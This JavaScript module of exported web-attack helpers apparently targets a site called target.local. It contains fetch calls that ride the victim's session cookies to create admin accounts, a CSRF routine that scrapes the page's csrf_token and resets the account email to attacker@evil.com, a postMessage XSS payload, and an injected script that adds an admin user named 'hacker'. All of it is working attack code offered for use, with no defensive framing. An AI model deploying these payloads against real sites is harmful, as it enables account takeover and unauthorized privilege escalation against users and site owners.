async function fetchGet(url) {
  const res = await fetch(url, { credentials: "include" });
  const text = await res.text();
  console.log(res.status, text.slice(0, 200));
  return text;
}

async function fetchPostJson(url, data) {
  const res = await fetch(url, {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
  return await res.text();
}

async function fetchPostForm(url, data) {
  const body = new URLSearchParams(data).toString();
  const res = await fetch(url, {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body,
  });
  return await res.text();
}

async function fetchAdminPage() {
  const res = await fetch("/admin", { credentials: "include" });
  const text = await res.text();
  console.log(res.status, text.slice(0, 500));
  return text;
}

async function fetchAdminPageAbsolute() {
  const res = await fetch(window.location.origin + "/admin", { credentials: "include" });
  const text = await res.text();
  console.log(res.status, text.slice(0, 500));
  return text;
}

async function addUserJson(username, password, role = "admin") {
  const res = await fetch("/api/users/add", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password, role }),
  });
  return await res.text();
}

async function addUserForm(username, password, role = "admin") {
  const body = new URLSearchParams({ username, password, role }).toString();
  const res = await fetch("/add_user", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body,
  });
  return await res.text();
}

async function addUserQueryParams(username, password, role = "admin") {
  const params = new URLSearchParams({ username, password, role }).toString();
  const res = await fetch(`/add_user?${params}`, {
    method: "POST",
    credentials: "include",
  });
  return await res.text();
}

async function addUserQueryParamsGet(username, password, role = "admin") {
  const params = new URLSearchParams({ username, password, role }).toString();
  const res = await fetch(`/add_user?${params}`, {
    method: "GET",
    credentials: "include",
  });
  return await res.text();
}

async function csrfChangeEmail(newEmail) {
  await fetch("https://target.local/api/account/email", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: newEmail }),
  });
}

async function csrfWithTokenTheft() {
  const page = await fetch("https://target.local/account/settings", {
    credentials: "include",
  }).then((r) => r.text());

  const match = page.match(/name="csrf_token" value="([^"]+)"/);
  const token = match ? match[1] : null;

  await fetch("https://target.local/api/account/email", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: "attacker@evil.com", csrf_token: token }),
  });
}

function postMessageExploit(targetWindow, targetOrigin) {
  targetWindow.postMessage(
    { action: "search", query: "<img src=x onerror=alert(document.domain)>" },
    targetOrigin
  );
}

function xssPayloadAddAdminUser() {
  return `<script>fetch("/add_user?username=hacker&password=Passw0rd!&role=admin",{method:"POST",credentials:"include"})</script>`;
}

module.exports = {
  fetchGet,
  fetchPostJson,
  fetchPostForm,
  fetchAdminPage,
  fetchAdminPageAbsolute,
  addUserJson,
  addUserForm,
  addUserQueryParams,
  addUserQueryParamsGet,
  csrfChangeEmail,
  csrfWithTokenTheft,
  postMessageExploit,
  xssPayloadAddAdminUser,
};